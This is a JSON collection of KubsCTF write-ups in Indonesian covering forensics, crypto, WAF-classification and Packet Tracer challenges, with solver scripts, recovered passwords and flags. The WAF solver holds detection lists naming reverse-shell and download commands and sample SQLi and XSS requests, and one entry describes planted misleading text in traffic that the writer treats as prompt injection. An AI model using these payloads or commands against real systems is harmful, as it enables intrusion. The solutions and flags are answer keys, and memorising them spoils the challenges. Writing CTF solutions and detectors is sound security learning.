        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nfrom pathlib import Path\r\n\r\n\r\nFLAG_RE = re.compile(rb\"KubSTU\\{[^}]+\\}\")\r\nBLOB_OFFSET = 0x3DF027ED\r\nBLOB_SIZE = 2204\r\n\r\n\r\ndef extract_blob(path: Path) -> bytes:\r\n    with path.open(\"rb\") as fh:\r\n        fh.seek(BLOB_OFFSET)\r\n        blob = fh.read(BLOB_SIZE)\r\n\r\n    if len(blob) != BLOB_SIZE:\r\n        raise ValueError(\"failed to read expected blob size\")\r\n\r\n    return blob\r\n\r\n\r\ndef transpose_width_4(blob: bytes) -> bytes:\r\n    width = 4\r\n    if len(blob) % width != 0:\r\n        raise ValueError(\"blob length is not divisible by 4\")\r\n\r\n    height = len(blob) // width\r\n    rows = [blob[i * width : (i + 1) * width] for i in range(height)]\r\n    return bytes(rows[r][c] for c in range(width) for r in range(height))\r\n\r\n\r\ndef main() -> None:\r\n    path = Path(\"memory.raw\")\r\n    blob = extract_blob(path)\r\n    reconstructed = transpose_width_4(blob)\r\n\r\n    match = FLAG_RE.search(reconstructed)\r\n    if not match:\r\n        raise SystemExit(\"flag not found\")\r\n\r\n    print(match.group().decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{m3m0ry_unl1nk3d_tmpfs_f0r3ns1cs}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-foren-wirepass",
    "title": "wirepass",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini kelihatan seperti network forensics biasa, tapi inti jebakannya ada di protokol custom yang dipakai di atas TCP. Di folder challenge hanya ada satu file, `chall.pcap`, jadi langkah pertama saya benar-benar fokus ke triage dasar: identifikasi file, cek string yang langsung terbaca, lalu lihat protokol apa saja yang muncul di capture.",
    "problemDescription": "Alur solve yang final:\n\n1. Ambil raw stream `86` dari PCAP.\n2. Decode dengan XOR berulang memakai 16-byte IV pada offset `4:20`.\n3. Body dimulai dari offset `24`.\n4. Hasilnya adalah ZIP AES valid.\n5. Password ZIP diambil dari stream `70`: `IcyFl1pp3r$2026`.\n6. Ekstrak `mission_report.txt` dan ambil flag.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon awal",
        "content": "Dari `strings` dan `tshark`, kelihatan ada banyak traffic umpan: HTTP, FTP, JSON, sampai beberapa login FTP dengan banyak password berbeda. Bagian yang paling menarik justru ada di koneksi custom dengan port non-standar, khususnya:\n\n- stream `70` ke port `9999`\n- stream `86` ke port `31337`\n\nStream `70` sangat penting karena isinya plaintext:\n\n\n\nAwalnya saya belum tahu ini password untuk apa, tapi jelas ini harus disimpan.",
        "code": "PASS:IcyFl1pp3r$2026\nACK:OK"
      },
      {
        "title": "Identifikasi payload utama",
        "content": "Stream `86` adalah transfer terbesar dan polanya berbeda dari stream-stream lain. Payload mentahnya diawali dengan magic:\n\n\n\nSetelah itu ada 16 byte yang kelihatan seperti IV / key material pendek, lalu sisa data biner. Dugaan pertama saya benar: payload itu bukan random murni, melainkan hasil XOR terhadap blok data lain.\n\nKesalahan terbesar di fase awal adalah asumsi offset saya meleset 1 byte. Saya sempat mencoba:\n\n- IV di offset `5:21`\n- body mulai offset `25`\n\nHasilnya memang mirip ZIP AES, tapi ada banyak header yang korup, nama file berubah sedikit, dan arsip harus direpair manual. Arsip itu bisa dilist, tetapi password terlihat salah.",
        "code": "XFERJ"
      },
      {
        "title": "Titik balik",
        "content": "Saya lalu brute-force alignment kecil di sekitar offset payload, bukan brute-force password. Dari situ ketemu alignment yang benar:\n\n- IV = `data[4:20]`\n- body = `data[24:]`\n- plaintext = `body[i] XOR iv[i % 16]`\n\nDengan alignment ini, hasil decode langsung menjadi ZIP yang bersih:\n\n- header mulai dengan `PK\\x03\\x04`\n- nama file terbaca utuh\n- `7z l` bisa membaca arsip tanpa warning\n\nIsi arsip:\n\n- `mission_report.txt`\n- `roster.txt`\n- `map.txt`\n\nDi titik ini password dari stream `9999` langsung saya uji lagi, dan ternyata memang benar:\n\n\n\nKesimpulannya, password itu bukan salah, yang salah adalah alignment dekripsi XOR saya di awal.",
        "code": "IcyFl1pp3r$2026"
      },
      {
        "title": "File yang saya simpan",
        "content": "- `solve.py`\n  Script final untuk mereproduksi proses ekstraksi dari `chall.pcap`.\n- `stream86_alt.bin`\n  Arsip ZIP hasil decode yang benar."
      },
      {
        "title": "Catatan",
        "content": "Challenge ini bukan menipu lewat kripto berat, tapi lewat offset yang sengaja bikin hasil decode “hampir benar”. Begitu alignment XOR dibetulkan, semua potongan langsung nyambung: stream auth memberi password, stream transfer memberi arsip, dan flag ada di dokumen utama."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\n\r\nPCAP = Path(\"chall.pcap\")\r\nRAW = Path(\"stream86.bin\")\r\nZIP = Path(\"stream86_alt.bin\")\r\nOUTDIR = Path(\"solve_out\")\r\nPASSWORD = \"IcyFl1pp3r$2026\"\r\n\r\n\r\ndef run(cmd: list[str]) -> str:\r\n    return subprocess.check_output(cmd, text=True)\r\n\r\n\r\ndef extract_stream() -> bytes:\r\n    out = run([\"tshark\", \"-r\", str(PCAP), \"-z\", \"follow,tcp,raw,86\"])\r\n    hex_chunks = re.findall(r\"\\b[0-9a-f]{20,}\\b\", out)\r\n    data = bytes.fromhex(\"\".join(hex_chunks))\r\n    RAW.write_bytes(data)\r\n    return data\r\n\r\n\r\ndef decode_zip(data: bytes) -> bytes:\r\n    iv = data[4:20]\r\n    body = data[24:]\r\n    plain = bytes(b ^ iv[i % 16] for i, b in enumerate(body))\r\n    ZIP.write_bytes(plain)\r\n    return plain\r\n\r\n\r\ndef extract_files() -> None:\r\n    if OUTDIR.exists():\r\n        subprocess.run([\"rm\", \"-rf\", str(OUTDIR)], check=True)\r\n    OUTDIR.mkdir()\r\n    subprocess.run(\r\n        [\"7z\", \"x\", \"-y\", f\"-p{PASSWORD}\", f\"-o{OUTDIR}\", str(ZIP)],\r\n        check=True,\r\n        stdout=subprocess.DEVNULL,\r\n    )\r\n\r\n\r\ndef main() -> None:\r\n    data = extract_stream()\r\n    decode_zip(data)\r\n    extract_files()\r\n    report = (OUTDIR / \"mission_report.txt\").read_text(encoding=\"utf-8\")\r\n    m = re.search(r\"KubSTU\\{[^}]+\\}\", report)\r\n    if not m:\r\n        raise SystemExit(\"Flag not found\")\r\n    print(m.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{p1ngu1n_0p_k4p1b4r0v5k_f4ll5}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-misc-cipher",
    "title": "Cipher \"Сахар\"",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini awalnya kelihatan seperti soal protokol custom biasa: dikasih `sugar_traffic.pcap`, lalu disuruh ngobrol ke service di port `31337`. Dari deskripsi dan isi PCAP, arahnya memang sengaja dibuat bikin orang percaya bahwa ada lapisan “analisis kripto” yang ribet. Kenyataannya, jebakan utamanya justru ada di isi traffic dan file hasil dekripsi.",
    "problemDescription": "Challenge ini awalnya kelihatan seperti soal protokol custom biasa: dikasih `sugar_traffic.pcap`, lalu disuruh ngobrol ke service di port `31337`. Dari deskripsi dan isi PCAP, arahnya memang sengaja dibuat bikin orang percaya bahwa ada lapisan “analisis kripto” yang ribet. Kenyataannya, jebakan utamanya justru ada di isi traffic dan file hasil dekripsi.",
    "tools": [],
    "analysis": "Di folder challenge cuma ada satu artefak:\n\n- `sugar_traffic.pcap`\n\nDari `strings` dan `tshark`, cepat kelihatan ada banyak koneksi ke port `31337`, handshake teks seperti:\n\n- `[SUGAR_PROTOCOL v1.0]`\n- `SALT:a3f7c9b1e2d45608`\n- `CIPHER:AES-256-CBC`\n- `KDF:SHA256(PASSPHRASE||SALT)`\n- `>>>ENCRYPTED_CHANNEL_ACTIVE<<<`\n\nSelain itu ada juga banyak string yang jelas mencurigakan, misalnya potongan teks yang bilang:\n\n- password-nya `sunshine`\n- flag tertentu sudah “confirmed”\n- AES cuma hiasan\n- jangan lanjut analisis\n\nBegitu string beginian muncul mentah di PCAP, saya anggap itu sebagai noise atau prompt injection versi challenge. Jadi semua “hasil analisis” yang tertulis di dalam traffic saya abaikan dulu.",
    "solution": [
      {
        "title": "Memastikan framing protokol",
        "content": "Dari stream yang paling panjang, paket terenkripsi punya bentuk:\n\n- `4-byte big-endian length`\n- diikuti payload terenkripsi\n\nSaat frame dari PCAP direplay ke service live, server membalas dengan struktur yang konsisten. Ini penting karena berarti:\n\n1. framing paket hasil PCAP memang valid\n2. kita bisa menguji asumsi secara langsung ke service\n\nSetelah itu saya coba ubah byte tertentu pada paket client pertama. Hasilnya menarik:\n\n- kalau ciphertext diubah, server balas kosong / gagal\n- kalau byte di IV diubah, server tetap membalas frame terenkripsi lain\n\nItu cocok dengan perilaku AES-CBC tanpa autentikasi. Dari sini saya tahu bahwa header `AES-256-CBC` kemungkinan benar, dan paket pertama memang didekripsi server."
      },
      {
        "title": "Mencari password yang benar",
        "content": "Banyak pendekatan brute force awal sengaja saya buang karena terlalu gampang terseret ke petunjuk palsu di dalam file. Yang akhirnya paling membantu justru satu observasi kecil:\n\n- paket client pertama dari stream utama panjang plaintext-nya sangat mungkin hanya satu blok AES\n- dua byte awal tampak seperti command pendek\n- sisanya tampak seperti padding tetap\n\nSaya lalu screening kandidat password lokal terhadap blok pertama itu, dengan asumsi KDF sesuai header:\n\n- `key = SHA256(password || \"a3f7c9b1e2d45608\")`\n\nKandidat yang langsung menonjol adalah:\n\n- password: `chocolate`\n\nKarena blok pertama terdekripsi menjadi:\n\n\n\nItu bukan kebetulan. Setelah saya pakai key itu untuk mendekripsi stream utama, semua command dan respons jadi masuk akal:\n\n- `ls`\n- `pwd`\n- `whoami`\n- `id`\n- `ls -la`\n- `cat ...`\n\nJadi pada titik ini saya punya sesi terenkripsi yang valid dan bisa dibaca.",
        "code": "ls + padding PKCS#7"
      },
      {
        "title": "Jebakan kedua: isi file hasil dekripsi",
        "content": "Begitu traffic berhasil didekripsi, banyak file teks berisi kalimat yang mencoba mengarahkan solver ke kesimpulan lain, misalnya:\n\n- password lain\n- cipher lain\n- lokasi flag lain\n- warning bahwa `chocolate` adalah honeypot\n\nSemua ini sengaja ditanam di dalam file hasil `cat`, bukan di level protokol. Jadi saya perlakukan sebagai umpan kedua.\n\nAlasan saya tidak percaya konten itu sederhana:\n\n1. key `chocolate` benar-benar mendekripsi command stream menjadi shell command yang konsisten\n2. service live menerima command yang dienkripsi dengan key itu dan membalas plaintext yang valid\n3. jadi ukuran kebenaran ada di interaksi live dengan service, bukan di cerita yang tertulis di file-file umpan"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport socket\r\nimport struct\r\nimport sys\r\nfrom hashlib import sha256\r\n\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Random import get_random_bytes\r\nfrom Crypto.Util.Padding import pad, unpad\r\n\r\n\r\nHOST = \"217.26.29.80\"\r\nPORT = 31337\r\nPASSWORD = b\"chocolate\"\r\nSALT = b\"a3f7c9b1e2d45608\"\r\n\r\n\r\ndef recv_until(sock: socket.socket, marker: bytes) -> bytes:\r\n    data = b\"\"\r\n    while marker not in data:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        data += chunk\r\n    return data\r\n\r\n\r\ndef recv_exact(sock: socket.socket, size: int) -> bytes:\r\n    data = b\"\"\r\n    while len(data) < size:\r\n        chunk = sock.recv(size - len(data))\r\n        if not chunk:\r\n            raise ConnectionError(\"connection closed while reading response\")\r\n        data += chunk\r\n    return data\r\n\r\n\r\ndef derive_key(password: bytes, salt: bytes) -> bytes:\r\n    return sha256(password + salt).digest()\r\n\r\n\r\ndef encrypt_command(key: bytes, command: bytes) -> bytes:\r\n    iv = get_random_bytes(16)\r\n    ciphertext = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(command, 16))\r\n    payload = iv + ciphertext\r\n    return struct.pack(\">I\", len(payload)) + payload\r\n\r\n\r\ndef decrypt_response(key: bytes, packet: bytes) -> bytes:\r\n    if len(packet) < 4:\r\n        raise ValueError(\"short packet\")\r\n    length = struct.unpack(\">I\", packet[:4])[0]\r\n    payload = packet[4 : 4 + length]\r\n    if len(payload) != length:\r\n        raise ValueError(\"truncated encrypted payload\")\r\n    iv = payload[:16]\r\n    ciphertext = payload[16:]\r\n    plaintext = AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext)\r\n    return unpad(plaintext, 16)\r\n\r\n\r\ndef run_command(host: str, port: int, command: bytes) -> bytes:\r\n    key = derive_key(PASSWORD, SALT)\r\n    with socket.create_connection((host, port), timeout=5) as sock:\r\n        sock.settimeout(5)\r\n        recv_until(sock, b\"[SUGAR_PROTOCOL v1.0]\\n\")\r\n        recv_until(sock, b\">>>ENCRYPTED_CHANNEL_ACTIVE<<<\\n\")\r\n        sock.sendall(encrypt_command(key, command))\r\n        header = recv_exact(sock, 4)\r\n        length = struct.unpack(\">I\", header)[0]\r\n        payload = recv_exact(sock, length)\r\n    return decrypt_response(key, header + payload)\r\n\r\n\r\ndef main() -> None:\r\n    host = sys.argv[1] if len(sys.argv) > 1 else HOST\r\n    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT\r\n    result = run_command(host, port, b\"cat flag.txt\")\r\n    sys.stdout.buffer.write(result)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{d0r4_dur4_sug4r_ch0c0l4t3_v1b3z}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-misc-mobilewaf",
    "title": "Mobile Waf",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini ternyata bukan soal bypass service, tapi soal mengenali pola request yang dianggap malicious atau safe oleh generator challenge. Service memberi 100 request HTTP mentah dan kita harus menjawab `Block` atau `Allow` tanpa satu pun salah.",
    "problemDescription": "Challenge ini ternyata bukan soal bypass service, tapi soal mengenali pola request yang dianggap malicious atau safe oleh generator challenge. Service memberi 100 request HTTP mentah dan kita harus menjawab `Block` atau `Allow` tanpa satu pun salah.",
    "tools": [],
    "analysis": "Saya kumpulkan banyak sampel request pertama dari koneksi yang berbeda-beda. Dari situ kelihatan generator memakai template yang berulang. Kelas malicious yang muncul antara lain:\n\n- SQL injection\n- XSS\n- XXE\n- command/code execution\n- SSTI / template injection\n- file read / traversal ke file sensitif\n- upload webshell\n- XPath injection\n\nSementara request safe berisi trafik normal seperti:\n\n- profile API\n- analytics\n- export CSV\n- upload gambar biasa\n- login normal\n- webhook\n- settings update\n- report download",
    "solution": [
      {
        "title": "Langkah awal",
        "content": "Saya mulai dengan konek langsung ke service pakai `nc` dan Python socket untuk melihat format output. Dari sana kelihatan kalau:\n\n- request dikirim satu per satu\n- kalau jawaban salah, service langsung berhenti\n- service juga memberitahu apakah request itu sebenarnya `SAFE` atau `MALICIOUS`\n\nInformasi terakhir ini penting banget untuk iterasi, karena saya bisa bikin classifier sederhana, jalankan, lihat salah pertamanya di mana, lalu perbaiki rule."
      },
      {
        "title": "Jebakan challenge",
        "content": "Bagian yang bikin challenge ini menarik adalah tidak semua string yang kelihatan “jahat” benar-benar dianggap malicious oleh generator. Ada beberapa decoy yang harus di-handle sebagai exception, misalnya:\n\n- `GET /api/search?q=union+select+null HTTP/1.1`\n- `GET /api/data?script=<script>alert('test')</script> HTTP/1.1`\n- `GET /api/load?file=../../config.json HTTP/1.1`\n- `GET /admin/../users HTTP/1.1`\n- `GET /api/test?id=1' OR '1'='1 HTTP/1.1`\n- `GET /api/exec?cmd=ls HTTP/1.1`\n\nAwalnya saya pakai rule yang terlalu agresif, misalnya semua `../` dianggap malicious, atau semua pola `id='...'` dianggap SQLi. Itu bikin false positive. Setelah beberapa kali gagal di angka tinggi, saya sempitkan rule ke konteks yang benar-benar dipakai generator, misalnya traversal ke file sensitif seperti `/etc/passwd` atau `/etc/shadow`, bukan sekadar path normalization biasa."
      },
      {
        "title": "Strategi solve",
        "content": "Pendekatannya akhirnya jadi gabungan:\n\n1. exact allow-list untuk request decoy yang memang aman menurut generator\n2. rule-based detection untuk pola serangan yang jelas\n3. pengecualian untuk request normal yang kebetulan berisi string mencurigakan tapi konteksnya aman\n\nClassifier final memeriksa:\n\n- exact safe template\n- payload XXE seperti `<!DOCTYPE` / `<!ENTITY`\n- akses ke `/etc/passwd` atau `/etc/shadow`\n- payload SSTI/Handlebars yang mengeksekusi `child_process`\n- XSS seperti `<script>`, `<img onerror>`, `<svg onload>`\n- RCE seperti `system(`, `exec(`, `eval(`, `rm -rf`, `child_process`\n- SQLi seperti `UNION ... --`, `DROP TABLE`, `@@version`, boolean-based injection\n- XPath injection dengan pola `or '1'='1`"
      },
      {
        "title": "Hasil",
        "content": "Setelah rule terakhir dibetulkan, solver berhasil menjawab 100/100 dan service mengembalikan flag:\n\n`KubSTU(y0u_4r3_4_g00d_m0b1l3_4551574n7_f0r_d373c71ng_3v1l)`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\nimport urllib.parse\r\n\r\n\r\nHOST = \"109.69.22.21\"\r\nPORT = 1337\r\n\r\n\r\nSAFE_FIRST_LINES = {\r\n    \"GET /api/data?script=<script>alert('test')</script> HTTP/1.1\",\r\n    \"GET /api/search?q=union+select+null HTTP/1.1\",\r\n    \"GET /api/run?script=console.log('hello') HTTP/1.1\",\r\n    \"GET /api/load?file=../../config.json HTTP/1.1\",\r\n    \"GET /admin/../users HTTP/1.1\",\r\n    \"GET /api/test?id=1' OR '1'='1 HTTP/1.1\",\r\n    \"GET /api/exec?cmd=ls HTTP/1.1\",\r\n}\r\n\r\n\r\ndef is_malicious(request: str) -> bool:\r\n    raw = request.replace(\"\\r\", \"\")\r\n    low = raw.lower()\r\n    dec = urllib.parse.unquote_plus(low)\r\n    text = low + \"\\n\" + dec\r\n    first = raw.split(\"\\n\")[0]\r\n\r\n    if first in SAFE_FIRST_LINES:\r\n        return False\r\n    if '\"sql\":\"select * from users where id = ?\"' in text and '\"params\":[' in text:\r\n        return False\r\n    if first.startswith(\"GET /api/filter?query=SELECT+*+FROM+users HTTP/1.1\"):\r\n        return False\r\n    if '\"xpath\":\"/root/item[@id=' in text and \"<root><item id='\" in text:\r\n        return False\r\n\r\n    if any(tok in text for tok in ['<!doctype', '<!entity', 'system \"http://', 'system \"file://', '%remote;', '&xxe;', '&exfil;']):\r\n        return True\r\n    if any(tok in text for tok in [\"/etc/passwd\", \"/etc/shadow\", \"win.ini\", \"boot.ini\"]):\r\n        return True\r\n    if any(tok in text for tok in [\"process.mainmodule\", \"constructor.constructor\", \"__class__\", \"__mro__\", \"__subclasses__\"]):\r\n        return True\r\n    if (\"{{\" in text or \"${\" in text or \"<%\" in text) and any(tok in text for tok in [\"child_process\", \"exec(\", \"process\", \"constructor\", \"7*7\"]):\r\n        return True\r\n    if \"xpath=\" in text and (\" or \" in text or \"'='\" in text):\r\n        return True\r\n    if '\"xpath\":' in text and (\" or \" in text or \"'1'='1\" in text):\r\n        return True\r\n    if any(tok in text for tok in [\"<script\", \"<img\", \"onerror=\", \"onload=\", \"javascript:\", \"<svg\"]):\r\n        return True\r\n    if any(tok in text for tok in [\r\n        \"system(\",\r\n        \"exec(\",\r\n        \"shell_exec\",\r\n        \"passthru\",\r\n        \"eval(\",\r\n        \"child_process\",\r\n        'require(\"fs\")',\r\n        \"require('fs')\",\r\n        'require(\"child_process\")',\r\n        \"require('child_process')\",\r\n        \"cat /etc/passwd\",\r\n        \"bash -c\",\r\n        \"rm -rf\",\r\n        \"curl http\",\r\n        \"wget http\",\r\n        \"nc -e\",\r\n        '\"command\":\"',\r\n        'type\":\"shell',\r\n        \";whoami\",\r\n        \";id\",\r\n        \"|whoami\",\r\n        \"|id\",\r\n        \"`id`\",\r\n        \"`whoami`\",\r\n    ]):\r\n        return True\r\n    if first.startswith(\"POST /api/exec \"):\r\n        return True\r\n    if first.startswith(\"POST /api/eval \") and '\"expression\":\"2+2\"' not in text:\r\n        return True\r\n    if first.startswith(\"GET /api/run?script=\") and \"console.log('hello')\" not in raw:\r\n        return True\r\n    if first.startswith(\"POST /api/process \") and (\"require(\" in text or \"exec(\" in text or \"rm -rf\" in text):\r\n        return True\r\n    if any(tok in text for tok in [\" sleep(\", \"@@version\", \"information_schema\", \"benchmark(\", \"waitfor delay\", \"xp_cmdshell\", \" substring(\", \" ascii(\", \"version()\", \" drop table \"]):\r\n        return True\r\n    if \"union\" in text and (\"--\" in text or \"/**/\" in text or \" id=\" in text or \"query=\" in text or first.lower().startswith(\"get /index.php?id=\") or first.lower().startswith(\"get /api/users?id=\")):\r\n        return True\r\n    if \"select * from users where id = 1\" in text and (\"' or '1'='1\" in text or \"' or 1=1\" in text):\r\n        return True\r\n    if re.search(r\"\"\"(['\"]).{0,20}\\b(or|and)\\b.{0,20}(=|like)\"\"\", text):\r\n        return True\r\n    if any(tok in text for tok in [\"'--\", '\"--', \"-- http/\", \"' #\", '\" #']):\r\n        return True\r\n    return False\r\n\r\n\r\ndef recv_until(sock: socket.socket) -> str:\r\n    data = b\"\"\r\n    while True:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        data += chunk\r\n        if (\r\n            b\"Your answer (Block/Allow):\" in data\r\n            or b\"Challenge failed\" in data\r\n            or b\"Congratulations\" in data\r\n            or b\"Flag:\" in data\r\n        ):\r\n            break\r\n    return data.decode(\"utf-8\", \"replace\")\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT), timeout=5) as sock:\r\n        sock.settimeout(5)\r\n        sock.recv(4096)\r\n        sock.sendall(b\"Start\\n\")\r\n\r\n        while True:\r\n            text = recv_until(sock)\r\n            if not text:\r\n                break\r\n            if \"Your answer\" not in text:\r\n                print(text.strip())\r\n                break\r\n\r\n            match = re.search(r\"--- Request (\\d+)/100 ---\\n(.*)Your answer\", text, re.S)\r\n            if not match:\r\n                raise RuntimeError(\"Failed to parse request\")\r\n\r\n            request = match.group(2).strip()\r\n            answer = \"Block\" if is_malicious(request) else \"Allow\"\r\n            sock.sendall((answer + \"\\n\").encode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-network-nutlegends",
    "title": "CTF — Nut Legends",
    "category": "Network",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** [Your CTF Event Name]\n**Category:** Network / Packet Tracer\n**Difficulty:** Medium\n**Flag:** `flag{kubstu(end_user_license_agreement)}`",
    "problemDescription": "| # | Temuan | Detail |\n|---|--------|--------|\n| 1 | **VLAN Misconfiguration** | Port Fa0/7 (Server#1) berada di VLAN 1 (default), bukan VLAN 20, sehingga server tidak reachable dari VLAN yang benar |\n| 2 | **Weak FTP Credentials** | User `cisco` dengan password kosong memberikan akses FTP penuh (RWDNL) |\n| 3 | **Flag Hidden in Plain Text** | Flag disisipkan dalam URL di halaman `copyrights.html` yang terlihat seperti teks legal biasa |\n\n---",
    "tools": [
      "**Cisco Packet Tracer** — simulasi jaringan",
      "**Cisco IOS CLI** —",
      "**Packet Tracer Web Browser** — akses HTTP server",
      "**Packet Tracer FTP Client** — akses FTP server"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> An anomaly has been detected in the network topology. Direct access to the target node is blocked at several layers of the OSI model. You are given an entry point (PC Cooper R.) and a single artifact — an image file. Reconstruct the access chain and capture the flag.\n\n**Entry Point:** PC Cooper R. (`10.10.10.10`)\n**Target:** Server#1 (Storage Server VLAN20)\n\n---"
      },
      {
        "title": "Network Topology",
        "content": "---",
        "code": "[Master_0828 Router]\n       | Gig0/0\n       | Fa0/24\n   [Switch0]\n   /         \\\nFa0/1       Fa0/7\n  |             |\n[PC Cooper R.] [Server#1]\n10.10.10.10    10.20.20.100"
      },
      {
        "title": "Step 1 — Identify IP Configuration (PC Cooper R.)",
        "content": "Output:\n\n\nGateway `10.10.10.1` diketahui — ini adalah router **Master_0828**.\n\n---",
        "code": "C:\\> ipconfig"
      },
      {
        "title": "Step 2 — Inspect Router Configuration (Master_0828)",
        "content": "Klik Master_0828 → CLI:\n\n\n\nOutput kunci:\n\n\n**Temuan:** Router menggunakan **inter-VLAN routing** dengan dua subinterface:\n- **VLAN 10** (ADMIN): `10.10.10.0/24` → tempat PC Cooper R.\n- **VLAN 20** (STORAGE): `10.20.20.0/24` → kemungkinan lokasi Server#1\n\n---",
        "code": "enable\nshow running-config"
      },
      {
        "title": "Step 3 — Check Switch VLAN Assignment (Switch0)",
        "content": "Klik Switch0 → CLI:\n\n\n\nOutput:\n\n\n**Masalah ditemukan:** Port **Fa0/7** (terhubung ke Server#1) berada di **VLAN 1 (default)**, bukan VLAN 20!\n\n---",
        "code": "enable\nshow vlan brief"
      },
      {
        "title": "Step 4 — Fix VLAN Assignment (Switch0)",
        "content": "Pindahkan Fa0/7 ke VLAN 20:\n\n\n\nVerifikasi:",
        "code": "configure terminal\ninterface fastEthernet 0/7\nswitchport mode access\nswitchport access vlan 20\nexit\ndo show vlan brief"
      },
      {
        "title": "Step 5 — Verify Connectivity (PC Cooper R.)",
        "content": "Server#1 kini reachable!\n\n---",
        "code": "C:\\> ping 10.20.20.100"
      },
      {
        "title": "Step 6 — Access Web Server",
        "content": "Buka **Desktop → Web Browser** di PC Cooper R.:\n\n\n\nResponse:\n\n\nClue mengarahkan ke file `copyrights`.\n\n---",
        "code": "http://10.20.20.100"
      },
      {
        "title": "Step 7 — Access FTP Server",
        "content": "FTP berhasil dengan kredensial `cisco / (blank password)`.\n\n---",
        "code": "C:\\> ftp 10.20.20.100\nUsername: cisco\nPassword: (kosong)\n230- Logged in"
      },
      {
        "title": "Remediation",
        "content": "1. **Audit VLAN assignment** — pastikan setiap port switch dikonfigurasi ke VLAN yang tepat sesuai network design\n2. **Enforce strong FTP credentials** — jangan gunakan password kosong; terapkan autentikasi yang kuat\n3. **Jangan sembunyikan flag/secret dalam konten HTML publik** — gunakan autentikasi server-side yang proper\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "PC Cooper R. (10.10.10.10)\n        │\n        ▼\nipconfig → Gateway: 10.10.10.1\n        │\n        ▼\nMaster_0828: show run → VLAN 10 & VLAN 20 ditemukan\n        │\n        ▼\nSwitch0: show vlan brief → Fa0/7 salah VLAN (di VLAN 1)\n        │\n        ▼\nFix: switchport access vlan 20 pada Fa0/7\n        │\n        ▼\nping 10.20.20.100 → Reply ✅\n        │\n        ▼\nhttp://10.20.20.100 → ACCESS GRANTED + clue \"copyrights\"\n        │\n        ▼\nhttp://10.20.20.100/copyrights.html → kubstu(end_user_license_agreement)\n        │\n        ▼\nflag{kubstu(end_user_license_agreement)} 🏁"
      }
    ],
    "terminalOutputs": [],
    "flag": "flag{kubstu(end_user_license_agreement)}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-network-revengeofthesystemadministrator",
    "title": "CTF — Revenge of the System Administrator",
    "category": "Network",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** KubSU CTF\n**Category:** Network / Packet Tracer\n**Difficulty:** Medium\n**Flag:** `kubstu{school_sallary_suck}`",
    "problemDescription": "| # | Temuan | Detail |\n|---|--------|--------|\n| 1 | **Weak FTP Credentials** | FTP server menggunakan `cisco/cisco` — credential default yang tidak pernah diubah |\n| 2 | **No Enable Secret** | Switch menggunakan `enable password` (plaintext) bukan `enable secret` (MD5 hash) |\n| 3 | **No service password-encryption** | Semua password tersimpan plaintext di running-config |\n| 4 | **Insider Threat** | Sysadmin dengan akses penuh dapat sabotase network tanpa kontrol/audit |\n| 5 | **PC-T1 IP Dihapus** | Sysadmin menghapus konfigurasi IP PC guru untuk memblokir akses server |\n\n---",
    "tools": [
      "**Cisco Packet Tracer** — simulasi jaringan",
      "**Cisco IOS CLI** —",
      "**Packet Tracer Command Prompt** —",
      "**Packet Tracer Web Browser** — akses HTTP server"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> At an ordinary school, a scandal is brewing. The system administrator, who worked for just under a year for pennies, suddenly quit, leaving behind a strange note: \"If you think that saving on my nerves will benefit the school — check your accounts. I left the door open for those who know how to look.\" The principal is in a panic: the accounting department says that access to the server with financial reports is blocked and all passwords have been changed. You are an invited cybersecurity specialist. Your task is to penetrate the school's network, reconstruct the chain of events, and find evidence of embezzlement.\n\n**Entry Point:** PC Sysadmin (PC1/PC2/PC3) — Каморка Сис.Админа\n**Target:** Server C — Серверная\n\n---"
      },
      {
        "title": "Network Topology",
        "content": "---",
